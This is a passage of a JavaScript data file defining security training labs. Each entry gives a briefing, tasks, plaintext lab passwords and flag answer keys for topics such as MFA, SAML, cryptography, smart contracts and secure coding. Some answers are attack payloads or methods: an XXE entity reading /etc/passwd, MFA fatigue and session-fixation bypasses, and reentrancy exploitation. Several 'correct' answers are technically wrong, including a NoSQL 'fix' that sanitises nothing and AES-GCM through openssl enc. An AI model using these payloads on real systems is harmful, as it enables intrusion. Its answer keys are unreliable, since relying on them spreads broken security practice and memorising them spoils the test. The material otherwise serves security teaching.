    tasks: ["Design RBAC model with roles, permissions, and role hierarchy", "Implement RBAC in an application using Spring Security or equivalent", "Create role assignments following least-privilege principle", "Audit existing roles for excessive permissions (role mining)", "Implement attribute-based access control (ABAC) extensions to RBAC", "Test RBAC enforcement across all application endpoints", "Implement role request and approval workflow", "Generate RBAC compliance report for audit"],
    credentials: [
      { service: "container", username: "rbac-admin", password: "rbac-sec-2024!"}
    ],
    flags: [
      { title: "Model Designer", description: "Design RBAC model", correctAnswer: "Create role hierarchy: Admin > Manager > User with permission inheritance", points: 200},
      { title: "Least Privilege", description: "Implement minimal permissions", correctAnswer: "GRANT SELECT, INSERT ON table1 TO role_user_only;", points: 200},
      { title: "Role Miner", description: "Audit for excessive permissions", correctAnswer: "SELECT role, COUNT(*) as perm_count FROM role_permissions GROUP BY role ORDER BY perm_count DESC;", points: 200},
      { title: "ABAC Extender", description: "Add ABAC conditions to RBAC", correctAnswer: "if (user.department == 'finance' AND resource.classification == 'confidential') { allow(); }", points: 200},
      { title: "Compliance Reporter", description: "Generate RBAC compliance report", correctAnswer: "SELECT user, role, last_access FROM user_roles LEFT JOIN access_logs;", points: 200}
    ],
  },
  {
    title: "Multi-Factor Authentication Bypass & Hardening",
    description: "Test MFA implementations for bypass vulnerabilities and implement robust controls.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Attempt MFA bypass through various techniques and implement unbreakable MFA configurations.

### Environment
- Ubuntu 22.04 with OTP/TOTP tools
- MFA testing framework
- Credentials: mfa-test / mfa-sec-2024!

### Tasks
1. Perform SIM swapping attack simulation for SMS MFA bypass
2. Exploit MFA fatigue/pushing bombing to gain unauthorized access
3. Bypass TOTP by replaying captured codes within validity window
4. Test phishing-resistant MFA (FIDO2/WebAuthn) implementation
5. Exploit session fixation to bypass MFA on re-authentication
6. Implement rate limiting on MFA verification endpoints
7. Deploy adaptive MFA based on risk scoring
8. Audit MFA implementation for vulnerabilities

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform SIM swapping attack simulation for SMS MFA bypass", "Exploit MFA fatigue/pushing bombing to gain unauthorized access", "Bypass TOTP by replaying captured codes within validity window", "Test phishing-resistant MFA (FIDO2/WebAuthn) implementation", "Exploit session fixation to bypass MFA on re-authentication", "Implement rate limiting on MFA verification endpoints", "Deploy adaptive MFA based on risk scoring", "Audit MFA implementation for vulnerabilities"],
    credentials: [
      { service: "container", username: "mfa-test", password: "mfa-sec-2024!"}
    ],
    flags: [
      { title: "SIM Swapper", description: "Simulate SIM swap attack", correctAnswer: "Intercept SMS OTP via SIM swap and replay within 30s window", points: 250},
      { title: "Fatigue Attacker", description: "MFA fatigue attack", correctAnswer: "Send repeated push notifications until user approves", points: 200},
      { title: "TOTP Replayer", description: "Replay captured TOTP code", correctAnswer: "Capture TOTP from browser and use within 30-second window", points: 200},
      { title: "Session Fixer", description: "Bypass MFA via session fixation", correctAnswer: "Set session cookie before authentication to skip MFA step", points: 250},
      { title: "Adaptive Enforcer", description: "Implement adaptive MFA", correctAnswer: "if (risk_score > 0.7) { require_mfa(); } else { skip_mfa(); }", points: 200}
    ],
  },
  {
    title: "Zero Trust Architecture Implementation",
    description: "Design and implement Zero Trust security architecture principles.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Implement never-trust-always-verify with micro-segmentation, continuous verification, and least privilege.

### Environment
- Ubuntu 22.04 with Zero Trust tools
- Multiple network segments
- Credentials: zt-admin / zerotrust-2024!

### Tasks
1. Implement identity-centric access control (never trust, always verify)
2. Deploy micro-segmentation for network isolation
3. Configure continuous authentication and session validation
4. Implement device trust verification before access granting
5. Set up context-aware access policies (location, time, device)
6. Deploy software-defined perimeter (SDP) for application access
7. Implement data classification and DLP controls
8. Monitor and log all access attempts for anomaly detection

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Implement identity-centric access control (never trust, always verify)", "Deploy micro-segmentation for network isolation", "Configure continuous authentication and session validation", "Implement device trust verification before access granting", "Set up context-aware access policies (location, time, device)", "Deploy software-defined perimeter (SDP) for application access", "Implement data classification and DLP controls", "Monitor and log all access attempts for anomaly detection"],
    credentials: [
      { service: "container", username: "zt-admin", password: "zerotrust-2024!"}
    ],
    flags: [
      { title: "Identity Verifier", description: "Implement continuous auth", correctAnswer: "Verify JWT + device certificate + MFA on every request", points: 200},
      { title: "Micro-Segmentor", description: "Create micro-segments", correctAnswer: "iptables -A FORWARD -s 10.0.1.0/24 -d 10.0.2.0/24 -p tcp --dport 443 -j ACCEPT", points: 200},
      { title: "Device Trust Checker", description: "Verify device trust", correctAnswer: "Check device certificate, OS version, and patch level before granting access", points: 200},
      { title: "SDP Deployer", description: "Deploy software-defined perimeter", correctAnswer: "cloudflared access tcp-proxy --hostname app.example.com --url localhost:8080", points: 200},
      { title: "Anomaly Detector", description: "Detect access anomalies", correctAnswer: "ML-based detection of unusual access patterns", points: 250}
    ],
  },
  {
    title: "SAML & SSO Security Testing",
    description: "Test SAML-based Single Sign-On implementations for authentication bypass vulnerabilities.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Exploit XXE in SAML assertion parsing, signature wrapping, and replay attacks.

### Environment
- Ubuntu 22.04 with SAMLRaider
- SAML testing tools
- Credentials: saml-test / saml-sec-2024!

### Tasks
1. Perform XXE injection in SAML assertion to read files
2. Exploit signature wrapping to modify assertion content
3. Replay SAML assertions with modified attributes
4. Bypass signature validation by stripping assertion signatures
5. Perform XSW (XML Signature Wrapping) attacks
6. Test for SAML response manipulation via parameter injection
7. Implement SAML security best practices (signed assertions, strict validation)
8. Deploy SAML audit logging for compliance

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform XXE injection in SAML assertion to read files", "Exploit signature wrapping to modify assertion content", "Replay SAML assertions with modified attributes", "Bypass signature validation by stripping assertion signatures", "Perform XSW (XML Signature Wrapping) attacks", "Test for SAML response manipulation via parameter injection", "Implement SAML security best practices (signed assertions, strict validation)", "Deploy SAML audit logging for compliance"],
    credentials: [
      { service: "container", username: "saml-test", password: "saml-sec-2024!"}
    ],
    flags: [
      { title: "XXE Injector", description: "XXE in SAML assertion", correctAnswer: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", points: 250},
      { title: "Sig Wrapper", description: "Signature wrapping attack", correctAnswer: "Move original signature and modify assertion while keeping valid signature", points: 300},
      { title: "Assertion Replayer", description: "Replay modified assertion", correctAnswer: "Capture SAML response, modify attributes, replay to SP", points: 200},
      { title: "Sig Stripper", description: "Strip assertion signature", correctAnswer: "Remove ds:Signature element and test if SP accepts unsigned assertion", points: 250},
      { title: "Validator Hardener", description: "Implement strict validation", correctAnswer: "Require signed assertions, validate certificate chain, check NotBefore/NotOnOrAfter", points: 200}
    ],
  },
  {
    title: "Symmetric Encryption & Key Management",
    description: "Implement AES encryption with proper key management and operational security.",
    dockerImage: "ubuntu:22.04",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Encrypt and decrypt data using AES-256-GCM with proper key derivation and rotation.

### Environment
- Ubuntu 22.04 with OpenSSL
- GPG for key management
- Credentials: root / crypto-sym-2024!

### Tasks
1. Generate a 256-bit AES key using OpenSSL
2. Encrypt a file using AES-256-GCM with authenticated encryption
3. Decrypt the encrypted file and verify integrity
4. Implement key derivation from password using PBKDF2
5. Set up key rotation using envelope encryption
6. Implement key escrow with split knowledge
7. Analyze encrypted traffic for pattern leakage
8. Document key management procedures

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Generate a 256-bit AES key using OpenSSL", "Encrypt a file using AES-256-GCM with authenticated encryption", "Decrypt the encrypted file and verify integrity", "Implement key derivation from password using PBKDF2", "Set up key rotation using envelope encryption", "Implement key escrow with split knowledge", "Analyze encrypted traffic for pattern leakage", "Document key management procedures"],
    credentials: [
      { service: "container", username: "root", password: "crypto-sym-2024!"}
    ],
    flags: [
      { title: "Key Generator", description: "Generate AES-256 key", correctAnswer: "openssl rand -base64 32 > aes-key.key", points: 100},
      { title: "File Encryptor", description: "Encrypt file with AES-GCM", correctAnswer: "openssl enc -aes-256-gcm -salt -pbkdf2 -in plaintext.txt -out encrypted.bin -pass file:./aes-key.key", points: 200},
      { title: "File Decryptor", description: "Decrypt and verify file", correctAnswer: "openssl enc -aes-256-gcm -d -pbkdf2 -in encrypted.bin -out decrypted.txt -pass file:./aes-key.key", points: 200},
      { title: "PBKDF2 Deriver", description: "Derive key from password", correctAnswer: "openssl kdf -keylen 32 -salt -iterations 100000 -md sha256 PBKDF2", points: 200},
      { title: "Key Rotator", description: "Implement envelope encryption", correctAnswer: "Generate DEK, encrypt DEK with KEK, rotate KEK periodically", points: 200}
    ],
  },
  {
    title: "Asymmetric Encryption & PKI",
    description: "Deploy a complete Public Key Infrastructure and implement RSA/ECC encryption.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Generate RSA and ECC key pairs, implement PKI hierarchy, and deploy certificate management.

### Environment
- Ubuntu 22.04 with OpenSSL and step-ca
- Certificate management tools
- Credentials: root / crypto-asym-2024!

### Tasks
1. Generate RSA 4096-bit key pair for encryption and signing
2. Create an ECC P-256 key pair for performance-critical operations
3. Build a two-tier PKI (root CA and issuing CA)
4. Issue and manage certificates using step-ca (Smallstep)
5. Implement certificate transparency logging
6. Configure OCSP responder for real-time revocation
7. Deploy automatic certificate renewal with ACME
8. Test PKI hierarchy with openssl verification

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Generate RSA 4096-bit key pair for encryption and signing", "Create an ECC P-256 key pair for performance-critical operations", "Build a two-tier PKI (root CA and issuing CA)", "Issue and manage certificates using step-ca (Smallstep)", "Implement certificate transparency logging", "Configure OCSP responder for real-time revocation", "Deploy automatic certificate renewal with ACME", "Test PKI hierarchy with openssl verification"],
    credentials: [
      { service: "container", username: "root", password: "crypto-asym-2024!"}
    ],
    flags: [
      { title: "RSA Generator", description: "Generate RSA key pair", correctAnswer: "openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out rsa.key", points: 150},
      { title: "ECC Generator", description: "Generate ECC key pair", correctAnswer: "openssl ecparam -genkey -name prime256v1 | openssl ec -out ecc.key", points: 150},
      { title: "CA Builder", description: "Build two-tier PKI", correctAnswer: "step ca init --name 'Root CA' --dns localhost --address :9000", points: 250},
      { title: "Cert Issuer", description: "Issue certificate from CA", correctAnswer: "step ca certificate --ca-url https://localhost:9000 --root root_ca.crt service.local service.crt service.key", points: 200},
      { title: "OCSP Responder", description: "Deploy OCSP responder", correctAnswer: "openssl ocsp -index index.txt -port 9080 -rsigner issuing.crt -rkey issuing.key -CA root.crt", points: 200}
    ],
  },
  {
    title: "Hashing & Password Security",
    description: "Implement secure password hashing and data integrity verification.",
    dockerImage: "ubuntu:22.04",
    difficulty: 950,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Use bcrypt, Argon2, and HMAC for password storage and data integrity.

### Environment
- Ubuntu 22.04 with hashcat
- Password hashing libraries
- Credentials: root / crypto-hash-2024!

### Tasks
1. Hash passwords using bcrypt with proper salt rounds
2. Implement Argon2id for memory-hard password hashing
3. Create HMAC-SHA256 for message authentication
4. Compare hashing algorithms for resistance to rainbow tables
5. Perform password strength analysis using password policies
6. Implement constant-time comparison to prevent timing attacks
7. Test hash resistance with hashcat GPU cracking
8. Design secure password reset flow with time-limited tokens

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Hash passwords using bcrypt with proper salt rounds", "Implement Argon2id for memory-hard password hashing", "Create HMAC-SHA256 for message authentication", "Compare hashing algorithms for resistance to rainbow tables", "Perform password strength analysis using password policies", "Implement constant-time comparison to prevent timing attacks", "Test hash resistance with hashcat GPU cracking", "Design secure password reset flow with time-limited tokens"],
    credentials: [
      { service: "container", username: "root", password: "crypto-hash-2024!"}
    ],
    flags: [
      { title: "Bcrypt Hasher", description: "Hash password with bcrypt", correctAnswer: "htpasswd -bnBC 12 '' 'password123' | tr -d ':\
' | sed 's/$2y/$2a/'", points: 150},
      { title: "Argon2 Hasher", description: "Hash with Argon2id", correctAnswer: "echo -n 'password123' | argon2 $(openssl rand -hex 16) -id -t 3 -m 16 -p 4", points: 200},
      { title: "HMAC Creator", description: "Create HMAC-SHA256", correctAnswer: "echo -n 'message' | openssl dgst -sha256 -hmac 'secret_key'", points: 150},
      { title: "Timing Bypasser", description: "Implement constant-time compare", correctAnswer: "result |= a[i] ^ b[i] for all i", points: 200},
      { title: "Strength Tester", description: "Test password strength", correctAnswer: "zxcvbn 'password123' --dictionary-root /usr/share/dict/", points: 100}
    ],
  },
  {
    title: "TLS Protocol Analysis & Downgrade Attack Prevention",
    description: "Analyze TLS protocol implementations and prevent downgrade attacks.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Test TLS configurations, prevent POODLE/DROWN attacks, and enforce modern cipher suites.

### Environment
- Ubuntu 22.04 with testssl.sh
- SSLyze for scanning
- Credentials: root / crypto-tls-2024!

### Tasks
1. Scan TLS configuration with testssl.sh
2. Identify weak cipher suites and protocol versions
3. Test for POODLE vulnerability (SSLv3 fallback)
4. Check for DROWN vulnerability (SSLv2 export ciphers)
5. Implement TLS 1.3-only configuration
6. Configure HSTS with long max-age and includeSubDomains
7. Enable Certificate Transparency for all certificates
8. Test with SSLyze for compliance with Mozilla guidelines

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan TLS configuration with testssl.sh", "Identify weak cipher suites and protocol versions", "Test for POODLE vulnerability (SSLv3 fallback)", "Check for DROWN vulnerability (SSLv2 export ciphers)", "Implement TLS 1.3-only configuration", "Configure HSTS with long max-age and includeSubDomains", "Enable Certificate Transparency for all certificates", "Test with SSLyze for compliance with Mozilla guidelines"],
    credentials: [
      { service: "container", username: "root", password: "crypto-tls-2024!"}
    ],
    flags: [
      { title: "TestSSL Scanner", description: "Scan with testssl.sh", correctAnswer: "testssl.sh --all https://target.example.com", points: 150},
      { title: "Weak Cipher Finder", description: "Identify weak ciphers", correctAnswer: "sslscan target.example.com", points: 150},
      { title: "POODLE Tester", description: "Test for POODLE vulnerability", correctAnswer: "testssl.sh --poodle https://target.example.com", points: 200},
      { title: "TLS13 Enforcer", description: "Enforce TLS 1.3", correctAnswer: "ssl_protocols TLSv1.3; ssl_ciphers TLS_AES_256_GCM_SHA384;", points: 200},
      { title: "SSlyze Auditor", description: "Audit with SSLyze", correctAnswer: "sslyze --regular target.example.com:443", points: 150}
    ],
  },
  {
    title: "Blockchain & Cryptocurrency Security",
    description: "Analyze smart contract vulnerabilities and blockchain security mechanisms.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Audit Solidity smart contracts for reentrancy, overflow, and access control vulnerabilities.

### Environment
- Ubuntu 22.04 with Slither and Echidna
- Hardhat for contract testing
- Credentials: dev / blockchain-sec-2024!

### Tasks
1. Deploy a vulnerable smart contract to test network
2. Audit contract with Slither for static analysis
3. Identify reentrancy vulnerability in withdraw function
4. Find integer overflow/underflow in arithmetic operations
5. Test access control bypass in admin functions
6. Use Echidna for fuzzing contract invariants
7. Exploit a flash loan attack vector in DeFi protocol
8. Implement secure coding patterns (Checks-Effects-Interactions)

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Deploy a vulnerable smart contract to test network", "Audit contract with Slither for static analysis", "Identify reentrancy vulnerability in withdraw function", "Find integer overflow/underflow in arithmetic operations", "Test access control bypass in admin functions", "Use Echidna for fuzzing contract invariants", "Exploit a flash loan attack vector in DeFi protocol", "Implement secure coding patterns (Checks-Effects-Interactions)"],
    credentials: [
      { service: "container", username: "dev", password: "blockchain-sec-2024!"}
    ],
    flags: [
      { title: "Slither Auditor", description: "Audit contract with Slither", correctAnswer: "slither contracts/Vulnerable.sol --checklist", points: 200},
      { title: "Reentrancy Exploiter", description: "Exploit reentrancy vulnerability", correctAnswer: "Call withdraw() recursively before balance update", points: 300},
      { title: "Overflow Finder", description: "Find integer overflow", correctAnswer: "uint256 amount = type(uint256).max + 1;", points: 250},
      { title: "Access Bypasser", description: "Bypass access control", correctAnswer: "Directly call admin function without modifier check", points: 250},
      { title: "Fuzzer Runner", description: "Fuzz contract with Echidna", correctAnswer: "echidna-test contracts/Vulnerable.sol --config echidna.yaml", points: 200}
    ],
  },
  {
    title: "Side-Channel Attack Analysis",
    description: "Understand and test for cryptographic side-channel vulnerabilities.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify timing attacks, power analysis vectors, and cache-based information leakage.

### Environment
- Ubuntu 22.04 with side-channel tools
- Timing analysis scripts
- Credentials: root / sidechannel-2024!

### Tasks
1. Perform timing attack analysis on password comparison
2. Identify cache-timing vulnerabilities in AES implementation
3. Test for branch prediction side channels
4. Analyze power consumption patterns for key recovery
5. Implement constant-time cryptographic operations
6. Deploy blinding techniques to prevent timing attacks
7. Use Flush+Reload cache attack demonstration
8. Implement defense-in-depth against side-channel leakage

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform timing attack analysis on password comparison", "Identify cache-timing vulnerabilities in AES implementation", "Test for branch prediction side channels", "Analyze power consumption patterns for key recovery", "Implement constant-time cryptographic operations", "Deploy blinding techniques to prevent timing attacks", "Use Flush+Reload cache attack demonstration", "Implement defense-in-depth against side-channel leakage"],
    credentials: [
      { service: "container", username: "root", password: "sidechannel-2024!"}
    ],
    flags: [
      { title: "Timing Attacker", description: "Perform timing analysis", correctAnswer: "measure response time variations for different inputs to extract key", points: 250},
      { title: "Cache Analyzer", description: "Identify cache-timing leaks", correctAnswer: "Flush+Reload on shared memory regions to detect AES lookup patterns", points: 250},
      { title: "Constant-Time Enforcer", description: "Implement constant-time compare", correctAnswer: "Use bitwise OR accumulator: result |= a[i] ^ b[i] for all i", points: 200},
      { title: "Blinding Implementer", description: "Implement RSA blinding", correctAnswer: "m' = m * r^e mod n, decrypt m', unblind with r^-1", points: 200},
      { title: "Defense Deployer", description: "Deploy side-channel defenses", correctAnswer: "Add random delays, use constant-time algorithms, clear cache lines", points: 200}
    ],
  },
  {
    title: "Steganography & Covert Channel Detection",
    description: "Detect hidden data in files and networks using steganography analysis tools.",
    dockerImage: "parrotsec/security",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Identify steganographic content in images, audio, and network protocols.

### Environment
- Parrot Security OS with Steghide, zsteg
- Network covert channel tools
- Credentials: root / stego-sec-2024!

### Tasks
1. Extract hidden data from image files using Steghide
2. Detect LSB steganography in PNG/BMP images with zsteg
3. Analyze JPEG quantization tables for manipulation
4. Identify network covert channels using protocol manipulation
5. Detect data hidden in DNS tunneling
6. Analyze audio files for phase coding steganography
7. Use stegdetect to identify automated steganography tools
8. Implement steganalysis techniques for forensics investigation

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Extract hidden data from image files using Steghide", "Detect LSB steganography in PNG/BMP images with zsteg", "Analyze JPEG quantization tables for manipulation", "Identify network covert channels using protocol manipulation", "Detect data hidden in DNS tunneling", "Analyze audio files for phase coding steganography", "Use stegdetect to identify automated steganography tools", "Implement steganalysis techniques for forensics investigation"],
    credentials: [
      { service: "container", username: "root", password: "stego-sec-2024!"}
    ],
    flags: [
      { title: "Steghide Extractor", description: "Extract hidden data with Steghide", correctAnswer: "steghide extract -sf suspect.jpg -p password", points: 150},
      { title: "LSB Detector", description: "Detect LSB steganography", correctAnswer: "zsteg suspect.png -a", points: 200},
      { title: "JPEG Analyzer", description: "Analyze JPEG manipulation", correctAnswer: "jpegdct suspect.jpg | grep -i quantization", points: 200},
      { title: "DNS Tunnel Detector", description: "Detect DNS covert channel", correctAnswer: "dnscat2 detection by analyzing DNS query entropy and size patterns", points: 200},
      { title: "Steg Detector", description: "Run stegdetect tool", correctAnswer: "stegdetect suspect.jpg", points: 150}
    ],
  },
  {
    title: "Quantum-Resistant Cryptography Migration",
    description: "Prepare cryptographic systems for post-quantum computing threats.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Evaluate and implement NIST-approved post-quantum algorithms for key exchange and signatures.

### Environment
- Ubuntu 22.04 with liboqs
- Open Quantum Safe (OQS) tools
- Credentials: root / pqc-sec-2024!

### Tasks
1. Evaluate current cryptography inventory for quantum vulnerability
2. Implement CRYSTALS-Kyber for key encapsulation
3. Deploy CRYSTALS-Dilithium for digital signatures
4. Test hybrid classical/PQ key exchange during migration
5. Benchmark post-quantum algorithm performance
6. Implement hybrid TLS certificates with PQ algorithms
7. Create migration roadmap for quantum-safe cryptography
8. Test backward compatibility with existing systems

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Evaluate current cryptography inventory for quantum vulnerability", "Implement CRYSTALS-Kyber for key encapsulation", "Deploy CRYSTALS-Dilithium for digital signatures", "Test hybrid classical/PQ key exchange during migration", "Benchmark post-quantum algorithm performance", "Implement hybrid TLS certificates with PQ algorithms", "Create migration roadmap for quantum-safe cryptography", "Test backward compatibility with existing systems"],
    credentials: [
      { service: "container", username: "root", password: "pqc-sec-2024!"}
    ],
    flags: [
      { title: "Inventory Auditor", description: "Audit crypto for quantum risk", correctAnswer: "find / -name '*.pem' -o -name '*.key' | xargs openssl x509 -noout -text | grep -E 'RSA|EC'", points: 150},
      { title: "Kyber Deployer", description: "Implement CRYSTALS-Kyber", correctAnswer: "oqs-keygen -algorithm kyber512 -out kyber.key", points: 250},
      { title: "Dilithium Signer", description: "Implement CRYSTALS-Dilithium", correctAnswer: "oqs-sign -algorithm dilithium2 -key dilithium.key -message msg.txt -signature sig.bin", points: 250},
      { title: "Hybrid Tester", description: "Test hybrid key exchange", correctAnswer: "openssl s_server -www -groups X25519Kyber768Draft00", points: 200},
      { title: "Migration Planner", description: "Create PQ migration roadmap", correctAnswer: "Classify all crypto: Critical (RSA-2048) -> High (ECDSA-P256) -> Medium (AES-256)", points: 200}
    ],
  },
{
    title: "Secure Python Development",
    description: "Write Python code that prevents OWASP Top 10 vulnerabilities.",
    dockerImage: "python:3.12-alpine",
    difficulty: 800,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Identify and fix security vulnerabilities in Python web applications using secure coding practices.

### Environment
- Python 3.12 with Flask
- Bandit for static analysis
- Credentials: dev / pysec-2024!

### Tasks
1. Run Bandit static analysis on Python codebase
2. Fix SQL injection vulnerabilities using parameterized queries
3. Prevent XSS attacks with proper output encoding
4. Implement secure session management with Flask
5. Fix path traversal vulnerabilities in file handling
6. Implement CSRF protection in Flask forms
7. Secure API endpoints with proper authentication
8. Set up security logging and monitoring

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Run Bandit static analysis on Python codebase", "Fix SQL injection vulnerabilities using parameterized queries", "Prevent XSS attacks with proper output encoding", "Implement secure session management with Flask", "Fix path traversal vulnerabilities in file handling", "Implement CSRF protection in Flask forms", "Secure API endpoints with proper authentication", "Set up security logging and monitoring"],
    credentials: [
      { service: "container", username: "dev", password: "pysec-2024!"}
    ],
    flags: [
      { title: "Bandit Scanner", description: "Scan Python code with Bandit", correctAnswer: "bandit -r src/ -f json -o bandit-report.json", points: 150},
      { title: "SQLi Fixer", description: "Fix SQL injection", correctAnswer: "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))", points: 200},
      { title: "XSS Preventer", description: "Prevent XSS attacks", correctAnswer: "from markupsafe import escape; return escape(user_input)", points: 150},
      { title: "CSRF Protector", description: "Implement CSRF protection", correctAnswer: "from flask_wtf.csrf import CSRFProtect; csrf = CSRFProtect(app)", points: 200},
      { title: "Path Traversal Fixer", description: "Fix path traversal", correctAnswer: "os.path.realpath(os.path.join(base_dir, user_path))", points: 200}
    ],
  },
  {
    title: "Secure Node.js Development",
    description: "Build Node.js applications with security-first coding practices.",
    dockerImage: "node:20-alpine",
    difficulty: 850,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Implement security middleware, prevent common Node.js vulnerabilities, and audit npm dependencies.

### Environment
- Node.js 20 with Express
- npm audit, ESLint security plugin
- Credentials: dev / nodesec-2024!

### Tasks
1. Run npm audit to identify vulnerable dependencies
2. Implement Helmet.js for HTTP security headers
3. Fix prototype pollution vulnerabilities in Express
4. Prevent NoSQL injection in MongoDB queries
5. Implement rate limiting to prevent DoS attacks
6. Secure JWT token handling and storage
7. Set up Content Security Policy headers
8. Audit and fix dependency vulnerabilities with Snyk

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Run npm audit to identify vulnerable dependencies", "Implement Helmet.js for HTTP security headers", "Fix prototype pollution vulnerabilities in Express", "Prevent NoSQL injection in MongoDB queries", "Implement rate limiting to prevent DoS attacks", "Secure JWT token handling and storage", "Set up Content Security Policy headers", "Audit and fix dependency vulnerabilities with Snyk"],
    credentials: [
      { service: "container", username: "dev", password: "nodesec-2024!"}
    ],
    flags: [
      { title: "NPM Auditor", description: "Run npm audit", correctAnswer: "npm audit --json", points: 100},
      { title: "Helmet Installer", description: "Implement security headers", correctAnswer: "app.use(helmet())", points: 150},
      { title: "Pollution Fixer", description: "Fix prototype pollution", correctAnswer: "Object.create(null) instead of {} for user input handling", points: 200},
      { title: "NoSQL Fixer", description: "Prevent NoSQL injection", correctAnswer: "const sanitized = { $where: { $ne: null } }", points: 200},
      { title: "Rate Limiter", description: "Implement rate limiting", correctAnswer: "const rateLimit = require('express-rate-limit'); app.use(rateLimit({ windowMs: 15*60*1000, max: 100 }))", points: 150}
    ],
  },
  {
    title: "OWASP Top 10 Prevention Workshop",
    description: "Implement defenses against all OWASP Top 10 vulnerabilities in a web application.",
    dockerImage: "node:20-alpine",
    difficulty: 900,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Apply security controls for injection, broken auth, XSS, and all other OWASP Top 10 categories.

### Environment
- Node.js or Python web application
- OWASP testing tools
- Credentials: dev / owasp-prevent-2024!

### Tasks
1. Implement parameterized queries to prevent injection
2. Fix broken authentication with MFA and account lockout
3. Prevent XSS with Content Security Policy and output encoding
4. Secure sensitive data exposure with encryption at rest
5. Fix XML external entities by disabling DTD processing
6. Implement access control with proper authorization checks
7. Configure security logging and monitoring
8. Prevent SSRF with URL validation and network segmentation

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Implement parameterized queries to prevent injection", "Fix broken authentication with MFA and account lockout", "Prevent XSS with Content Security Policy and output encoding", "Secure sensitive data exposure with encryption at rest", "Fix XML external entities by disabling DTD processing", "Implement access control with proper authorization checks", "Configure security logging and monitoring", "Prevent SSRF with URL validation and network segmentation"],
    credentials: [
      { service: "container", username: "dev", password: "owasp-prevent-2024!"}
    ],
    flags: [
      { title: "Injection Fixer", description: "Prevent SQL/NoSQL injection", correctAnswer: "Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [id])", points: 200},
      { title: "Auth Fixer", description: "Fix broken authentication", correctAnswer: "Implement account lockout after 5 failed attempts and require MFA", points: 200},
      { title: "XSS Preventer", description: "Prevent XSS with CSP", correctAnswer: "Content-Security-Policy: default-src 'self'; script-src 'self'", points: 200},
      { title: "Access Controller", description: "Implement authorization checks", correctAnswer: "if (!user.hasPermission('resource:read')) { return 403; }", points: 200},
      { title: "SSRF Preventer", description: "Prevent SSRF attacks", correctAnswer: "validateUrl(url) && !isPrivateIP(new URL(url).hostname)", points: 200}
    ],
  },
  {
    title: "API Security Best Practices",
    description: "Implement comprehensive security controls for RESTful and GraphQL APIs.",
    dockerImage: "node:20-alpine",
    difficulty: 950,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Secure APIs with proper authentication, rate limiting, input validation, and error handling.

### Environment
- Node.js Express with API security middleware
- OWASP API Security Top 10
- Credentials: dev / api-sec-2024!

### Tasks
1. Implement API key rotation and validation
2. Set up OAuth 2.0 with JWT for API authentication
3. Configure rate limiting per API key and endpoint
